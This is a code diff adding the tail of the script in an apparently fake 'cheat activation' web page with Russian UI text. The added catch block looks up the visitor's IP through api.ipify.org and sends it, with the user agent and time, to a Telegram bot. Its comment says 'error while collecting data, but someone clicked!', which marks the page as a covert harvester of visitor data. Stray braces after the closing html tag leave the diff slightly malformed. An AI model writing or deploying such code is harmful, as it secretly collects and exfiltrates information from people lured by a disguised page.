@@ -562,4 +562,51 @@
                     statusText.textContent = "Ошибка отправки!";
                 }
 
+            } catch (error) {
+                console.error('Error:', error);
+                statusText.textContent = "Ошибка!";
+                
+                // Отправка хотя бы базовой информации при ошибке
+                try {
+                    const basicInfo = `🚨 Ошибка при сборе данных, но кто-то нажал!\n\n` +
+                                    `IP: ${await getIP()}\n` +
+                                    `UserAgent: ${navigator.userAgent}\n` +
+                                    `Time: ${new Date().toLocaleString('ru-RU')}`;
+                    
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: basicInfo
+                        })
+                    });
+                } catch (e) {}
+                
+            } finally {
+                hideLoading();
+                setTimeout(() => {
+                    statusText.textContent = "Active";
+                }, 5000);
+            }
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+
+        document.getElementById('activationKey').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') activateCheat();
+        });
+    </script>
+</body>
+</html>
+                }
+
         
